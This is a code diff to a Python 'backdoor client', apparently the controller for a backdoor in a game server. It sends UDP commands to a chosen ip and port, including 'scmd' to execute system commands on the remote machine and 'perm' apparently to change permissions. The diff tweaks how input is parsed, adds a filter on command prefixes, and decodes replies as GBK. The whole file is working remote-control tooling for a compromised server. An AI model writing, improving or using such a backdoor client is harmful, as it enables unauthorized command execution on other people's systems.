@@ -15,8 +15,8 @@ def get_udp_socket(loc_port=random.randint(1024, 65535), timeout: int=1, use_ipv
 
 if __name__ == "__main__":
     sk = get_udp_socket()
-    addr_str = input("Please input server ip:port like 127.0.0.1:19132\n")
-    addr = addr_str.split(":")
+    addr_str = input("Please input server ip port like 127.0.0.1 19132\n")
+    addr = addr_str.split(" ")
     target = (addr[0], int(addr[1]))
     print("backdoor client. Type q to quit")
     print("scmd [cmd] - execute system command")
@@ -26,10 +26,11 @@ if __name__ == "__main__":
         cmd = input(">>> ")
         if cmd == "q":
             break
+        if not any(cmd.startswith(f'{x} ') for x in ['scmd', 'gcmd', 'perm']):
+            continue
         sk.sendto(f"backdoor {cmd}\0".encode(), target)
         try:
-            ret_msg = sk.recvfrom(10240)[0].decode()[9:]
-            print(ret_msg)
+            ret_msg = sk.recvfrom(10240)[0].decode(encoding="gbk")[9:]
+            print(f"{ret_msg}")
         except socket.timeout:
-            print("timeout.")
             pass
